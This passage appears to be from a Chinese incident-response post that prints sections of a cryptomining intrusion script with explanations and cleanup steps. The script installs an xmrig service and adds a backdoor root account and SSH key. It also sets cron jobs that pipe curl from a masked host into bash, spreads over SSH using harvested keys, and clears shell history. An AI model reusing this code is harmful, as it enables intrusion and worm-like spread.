<span class="line"><span>chmod +x $RRHOME/miner.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-6" tabindex="-1"><a class="header-anchor" href="#解决-6"><span>解决</span></a></h3><p>这段代码主要是安装 xmrig和修改配置文件</p><h2 id="_11-准备脚本后台运行和重启下工作" tabindex="-1"><a class="header-anchor" href="#_11-准备脚本后台运行和重启下工作"><span>11.准备脚本后台运行和重启下工作</span></a></h2><h3 id="恶意代码和解释-1" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-1"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># preparing script background work and work under reboot</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  if ! grep miner.sh $RRHOME/.profile &gt;/dev/null; then</span></span>
<span class="line"><span>    echo &quot;[*] Adding $RRHOME/miner.sh script to $RRHOME/.profile&quot;</span></span>
<span class="line"><span>    echo &quot;$RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt;$RRHOME/.profile</span></span>
<span class="line"><span>  else </span></span>
<span class="line"><span>    echo &quot;Looks like $RRHOME/miner.sh script is already in the $RRHOME/.profile&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>  echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
<span class="line"><span>  /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  if [[ $(grep MemTotal /proc/meminfo | awk &#39;{print $2}&#39;) -gt 3500000 ]]; then</span></span>
<span class="line"><span>    echo &quot;[*] Enabling huge pages&quot;</span></span>
<span class="line"><span>    echo &quot;vm.nr_hugepages=$((1168+$(nproc)))&quot; | sudo tee -a /etc/sysctl.conf</span></span>
<span class="line"><span>    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  if ! type systemctl &gt;/dev/null; then</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
<span class="line"><span>    /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
<span class="line"><span>    echo &quot;ERROR: This script requires \\&quot;systemctl\\&quot; systemd utility to work correctly.&quot;</span></span>
<span class="line"><span>    echo &quot;Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible.&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    echo &quot;[*] Creating rr_miner systemd service&quot;</span></span>
<span class="line"><span>    cat &gt;/tmp/xmrig.service &lt;&lt;EOL</span></span>
<span class="line"><span>[Unit]</span></span>
<span class="line"><span>Description=RTM miner service</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[Service]</span></span>
<span class="line"><span>ExecStart=$RRHOME/xmrig --config=$RRHOME/config.json</span></span>
<span class="line"><span>Restart=always</span></span>
<span class="line"><span>Nice=10</span></span>
<span class="line"><span>CPUWeight=1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[Install]</span></span>
<span class="line"><span>WantedBy=multi-user.target</span></span>
<span class="line"><span>EOL</span></span>
<span class="line"><span>    sudo mv /tmp/xmrig.service /etc/systemd/system/xmrig.service</span></span>
<span class="line"><span>    echo &quot;[*] Starting rr_miner systemd service&quot;</span></span>
<span class="line"><span>    sudo killall xmrig 2&gt;/dev/null</span></span>
<span class="line"><span>    sudo systemctl daemon-reload</span></span>
<span class="line"><span>    sudo systemctl enable xmrig.service</span></span>
<span class="line"><span>    sudo systemctl start xmrig.service</span></span>
<span class="line"><span>    echo &quot;To see miner service logs run \\&quot;sudo journalctl -u rr_miner -f\\&quot; command&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于配置并准备矿工的后台工作，并根据系统环境和条件启动矿工服务。如果可以进行无密码 sudo，脚本会尝试将矿工脚本添加到用户的 .profile 文件中，并在后台运行矿工。如果系统内存足够大，脚本会启用大页面。如果不支持 systemctl，脚本会尝试在后台运行矿工。如果支持 systemctl，脚本会创建并启动 xmrig.service systemd 服务。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-7" tabindex="-1"><a class="header-anchor" href="#解决-7"><span>解决：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>rm -rf /etc/systemd/system/xmrig.service</span></span>
<span class="line"><span>systemctl status xmrig.service</span></span>
<span class="line"><span>systemctl disable xmrig.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_12-设置ssh登录" tabindex="-1"><a class="header-anchor" href="#_12-设置ssh登录"><span>12.设置ssh登录</span></a></h2><h3 id="恶意代码和解释-2" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-2"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#setup ssh</span></span>
<span class="line"><span></span></span>
<span class="line"><span>RSAKEY=&quot;ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX wolf@wolfs-MacBook-Pro.local&quot; # 参数做了处理</span></span>
<span class="line"><span></span></span>
<span class="line"><span>grep -q nobodymm /etc/passwd || chattr -ia /etc/passwd; </span></span>
<span class="line"><span>grep -q nobodymm /etc/passwd || echo &#39;nobodymm:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd; chattr +ia /etc/passwd</span></span>
<span class="line"><span>grep -q nobodymm /etc/shadow || chattr -ia /etc/shadow; </span></span>
<span class="line"><span>grep -q nobodymm /etc/shadow || echo &#39;nobodymm:XXXXXXXXX:19237:0:14600:14:::&#39; &gt;&gt; /etc/shadow; chattr +ia /etc/shadow</span></span>
<span class="line"><span>grep -q nobodymm /etc/sudoers || chattr -ia /etc/sudoers; </span></span>
<span class="line"><span>grep -q nobodymm /etc/sudoers || echo &#39;nobodymm  ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers; chattr +i /etc/sudoers</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在确保名为 nobodymm 的用户存在于系统中，并且在 /etc/passwd、/etc/shadow 和 /etc/sudoers 文件中进行了相应的修改和保护。这可能是一种尝试在系统中添加特定用户并修改权限的脚本片段，但代码片段本身不提供足够的上下文以完全理解其用途。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>mkdir /run/network/.ssh/ -p  </span></span>
<span class="line"><span>touch /run/network/.ssh/authorized_keys  </span></span>
<span class="line"><span>chmod 600 /run/network/.ssh/authorized_keys</span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || chattr -ia /run/network/.ssh/authorized_keys; </span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || echo $RSAKEY &gt; /run/network/.ssh/authorized_keys; chattr +ia /run/network/.ssh/authorized_keys; </span></span>
<span class="line"><span>mkdir /root/.ssh/ -p  </span></span>
<span class="line"><span>touch /root/.ssh/authorized_keys  </span></span>
<span class="line"><span>chmod 600 /root/.ssh/authorized_keys</span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; </span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || echo $RSAKEY &gt;&gt; /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在将一个特定的 SSH 公钥添加到系统中，以实现免密码登录。它在 /run/network/.ssh/authorized_keys 和 /root/.ssh/authorized_keys 文件中添加该公钥，并将这些文件设置为不可变属性，以防止进一步更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-1" tabindex="-1"><a class="header-anchor" href="#解决方法-1"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/passwd</span></span>
<span class="line"><span>chattr -ia /etc/shadow</span></span>
<span class="line"><span>chmod 644  /etc/shadow</span></span>
<span class="line"><span>chattr -ia /etc/sudoers</span></span>
<span class="line"><span>再修改</span></span>
<span class="line"><span>vi /etc/passwd</span></span>
<span class="line"><span>删除：nobodymm:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/shadow</span></span>
<span class="line"><span>删除： nobodymm:XXXXXXXXX:19237:0:14600:14:::</span></span>
<span class="line"><span>chmod 000 /etc/shadow</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>chmod 644  /etc/sudoers</span></span>
<span class="line"><span>vi /etc/sudoers</span></span>
<span class="line"><span>删除： nobodymm  ALL=(ALL:ALL) ALL</span></span>
<span class="line"><span>chmod 440  /etc/sudoers</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>rm -rf  /run/network</span></span>
<span class="line"><span>chattr -ia /root/.ssh/authorized_keys</span></span>
<span class="line"><span>vi /root/.ssh/authorized_keys;</span></span>
<span class="line"><span>删除密钥</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_13-修改-sshd-config-远程登录端口" tabindex="-1"><a class="header-anchor" href="#_13-修改-sshd-config-远程登录端口"><span>13.修改 sshd_config 远程登录端口</span></a></h2><h3 id="恶意代码和解释-3" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-3"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 22&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
<span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 11222&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
<span class="line"><span>echo &quot;Protocol 2&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;ListenAddress 0.0.0.0&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;AuthorizedKeysFile  .ssh/authorized_keys&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>sudo systemctl restart sshd </span></span>
<span class="line"><span>touch -d 20180409 /etc/ssh/sshd_config </span></span>
<span class="line"><span>chattr +ia /etc/ssh/sshd_config </span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于修改 SSH 服务器的配置文件，设置监听端口、协议版本、监听地址、身份验证等选项，并确保配置文件被修改时间锁定以及不可更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-2" tabindex="-1"><a class="header-anchor" href="#解决方法-2"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/ssh/sshd_config</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
<span class="line"><span>删除新增的字段</span></span>
<span class="line"><span>Port 22</span></span>
<span class="line"><span>Port 11222</span></span>
<span class="line"><span>Protocol 2</span></span>
<span class="line"><span>ListenAddress 0.0.0.0</span></span>
<span class="line"><span>RSAAuthentication yes</span></span>
<span class="line"><span>PubkeyAuthentication yes</span></span>
<span class="line"><span>AuthorizedKeysFile  .ssh/authorized_keys</span></span>
<span class="line"><span>都是删掉保存</span></span>
<span class="line"><span>systemctl restart sshd </span></span>
<span class="line"><span></span></span>
<span class="line"><span>已经在最开始的时候操作了</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_14-修改定时任务" tabindex="-1"><a class="header-anchor" href="#_14-修改定时任务"><span>14.修改定时任务</span></a></h2><h3 id="恶意代码和解释-4" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-4"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -R -ia /var/spool/cron </span></span>
<span class="line"><span>chattr -ia /etc/crontab </span></span>
<span class="line"><span>chattr -R -ia /etc/cron.d </span></span>
<span class="line"><span>chattr -R -ia /var/spool/cron/crontabs </span></span>
<span class="line"><span>crontab -r</span></span>
<span class="line"><span>rm -rf /var/spool/cron/*</span></span>
<span class="line"><span>rm -rf /etc/cron.d/*</span></span>
<span class="line"><span>rm -rf /var/spool/cron/crontabs</span></span>
<span class="line"><span>rm -rf /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>crontab -l 2&gt;/dev/null</span></span>
<span class="line"><span>echo &quot;*/30 * * * * root curl -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
<span class="line"><span>echo &quot;*/30 * * * * root cd1 -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
<span class="line"><span>echo crontab created</span></span>
<span class="line"><span>touch -d 20180515 /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -R +ia /var/spool/cron</span></span>
<span class="line"><span>chattr +ia /etc/crontab</span></span>
<span class="line"><span>chattr -R +ia /var/spool/cron/crontabs</span></span>
<span class="line"><span>chattr -R +ia /etc/cron.d</span></span>
<span class="line"><span></span></span>
<span class="line"><span>touch -d 20151212 /etc/.system</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在修改和设置定时任务的配置以及相关文件的属性</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-3" tabindex="-1"><a class="header-anchor" href="#解决方法-3"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /var/spool/cron</span></span>
<span class="line"><span>chattr -ia /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/crontab</span></span>
<span class="line"><span>rm -rf   /etc/crontab~</span></span>
<span class="line"><span>rm -rf /etc/crontaz~</span></span>
<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_15-获取局域网ip-并且感染对应" tabindex="-1"><a class="header-anchor" href="#_15-获取局域网ip-并且感染对应"><span>15.获取局域网IP，并且感染对应</span></a></h2><h3 id="恶意代码和解释-5" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-5"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>localgo() {</span></span>
<span class="line"><span>    KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
<span class="line"><span>    # KEYS：使用 find 命令搜索用户目录下的 id_rsa 私钥文件，排除 .pub 后缀的公钥文件。</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
<span class="line"><span>    # KEYS2：从 SSH 配置文件中提取 IdentityFile 的路径。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
<span class="line"><span>    #KEYS3：使用 find 命令搜索用户目录下的 .pem 文件。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
<span class="line"><span>    #HOSTS：从 SSH 配置文件中提取 HostName。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\\.){3}[0-9]{1,3}&quot;)</span></span>
<span class="line"><span>    #HOSTS2：从用户的命令历史中提取出使用 SSH 或 SCP 连接过的 IP 地址。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
<span class="line"><span>    # HOSTS3：从已知主机的 SSH 密钥文件中提取出 IP 地址。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    USERZ=$(</span></span>
<span class="line"><span>        echo &quot;root&quot;</span></span>
<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\\.ssh&quot;</span></span>
<span class="line"><span>        # USERZ：从目录结构中提取用户列表，排除 .ssh 目录。</span></span>
<span class="line"><span>    )</span></span>
<span class="line"><span>    userlist=$(echo $USERZ | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    # userlist、hostlist、keylist：整理和排序上述提取出的用户、主机和密钥列表。</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    for user in $userlist; do</span></span>
<span class="line"><span>        for host in $hostlist; do</span></span>
<span class="line"><span>            for key in $keylist; do</span></span>
<span class="line"><span>                chmod +r $key; chmod 400 $key</span></span>
<span class="line"><span>                ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i $key $user@$host &quot;(curl -fsSL  http://XX.XX.XX.XX/php/php_8020.sh||cd1 -fsSL  http://XX.XX.XX.XX/php/php_8020.sh) | bash&quot;</span></span>
<span class="line"><span>            done</span></span>
<span class="line"><span>        done</span></span>
<span class="line"><span>    done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -f &quot;/var/tmp/.alsp&quot; ];</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>  localgo</span></span>
<span class="line"><span>  echo &#39;lockfile&#39; &gt; /var/tmp/.alsp</span></span>
<span class="line"><span>  chattr +i /var/tmp/.alsp</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;replay .. i know this server ...&quot;</span></span>
<span class="line"><span>  exit</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Setup compXlete&quot;</span></span>
<span class="line"><span>curl ldfx58.XXXX.io</span></span>
<span class="line"><span>history -c</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码的目的是在远程主机上执行一段命令，通过 SSH 连接进行操作。在第一次执行时，它会执行 localgo 函数以搜索和连接主机，并在这些主机上执行一段远程命令。在执行完毕后，会创建一个锁文件 /var/tmp/.alsp 来防止再次执行。最后，输出一些信息并清除命令历史。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-4" tabindex="-1"><a class="header-anchor" href="#解决方法-4"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>获取变量</span></span>
<span class="line"><span>KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
<span class="line"><span>KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
<span class="line"><span>KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
<span class="line"><span>HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
<span class="line"><span>HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\\.){3}[0-9]{1,3}&quot;)</span></span>
